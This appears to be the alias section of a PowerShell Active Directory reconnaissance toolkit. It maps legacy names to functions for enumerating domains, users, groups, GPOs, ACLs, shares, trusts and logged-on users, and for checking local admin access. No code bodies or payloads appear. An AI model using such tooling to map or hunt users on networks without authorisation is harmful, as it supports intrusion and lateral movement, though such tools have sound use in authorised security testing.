Set-Alias Get-DNSRecord Get-DomainDNSRecord
Set-Alias Get-NetDomain Get-Domain
Set-Alias Get-NetDomainController Get-DomainController
Set-Alias Get-NetForest Get-Forest
Set-Alias Get-NetForestDomain Get-ForestDomain
Set-Alias Get-NetForestCatalog Get-ForestGlobalCatalog
Set-Alias Get-NetUser Get-DomainUser
Set-Alias Get-UserEvent Get-DomainUserEvent
Set-Alias Get-NetComputer Get-DomainComputer
Set-Alias Get-ADObject Get-DomainObject
Set-Alias Set-ADObject Set-DomainObject
Set-Alias Get-ObjectAcl Get-DomainObjectAcl
Set-Alias Add-ObjectAcl Add-DomainObjectAcl
Set-Alias Invoke-ACLScanner Find-InterestingDomainAcl
Set-Alias Get-GUIDMap Get-DomainGUIDMap
Set-Alias Get-NetOU Get-DomainOU
Set-Alias Get-NetSite Get-DomainSite
Set-Alias Get-NetSubnet Get-DomainSubnet
Set-Alias Get-NetGroup Get-DomainGroup
Set-Alias Find-ManagedSecurityGroups Get-DomainManagedSecurityGroup
Set-Alias Get-NetGroupMember Get-DomainGroupMember
Set-Alias Get-NetFileServer Get-DomainFileServer
Set-Alias Get-DFSshare Get-DomainDFSShare
Set-Alias Get-NetGPO Get-DomainGPO
Set-Alias Get-NetGPOGroup Get-DomainGPOLocalGroup
Set-Alias Find-GPOLocation Get-DomainGPOUserLocalGroupMapping
Set-Alias Find-GPOComputerAdmin Get-DomainGPOComputerLocalGroupMapping
Set-Alias Get-LoggedOnLocal Get-RegLoggedOn
Set-Alias Invoke-CheckLocalAdminAccess Test-AdminAccess
Set-Alias Get-SiteName Get-NetComputerSiteName
Set-Alias Get-Proxy Get-WMIRegProxy
Set-Alias Get-LastLoggedOn Get-WMIRegLastLoggedOn
Set-Alias Get-CachedRDPConnection Get-WMIRegCachedRDPConnection
Set-Alias Get-RegistryMountedDrive Get-WMIRegMountedDrive
Set-Alias Get-NetProcess Get-WMIProcess
Set-Alias Invoke-ThreadedFunction New-ThreadedFunction
Set-Alias Invoke-UserHunter Find-DomainUserLocation
Set-Alias Invoke-ProcessHunter Find-DomainProcess
Set-Alias Invoke-EventHunter Find-DomainUserEvent
Set-Alias Invoke-ShareFinder Find-DomainShare
Set-Alias Invoke-FileFinder Find-InterestingDomainShareFile
Set-Alias Invoke-EnumerateLocalAdmin Find-DomainLocalGroupMember
Set-Alias Get-NetDomainTrust Get-DomainTrust
Set-Alias Get-NetForestTrust Get-ForestTrust
Set-Alias Find-ForeignUser Get-DomainForeignUser
Set-Alias Find-ForeignGroup Get-DomainForeignGroupMember
Set-Alias Invoke-MapDomainTrust Get-DomainTrustMapping
Set-Alias Get-DomainPolicy Get-DomainPolicyData
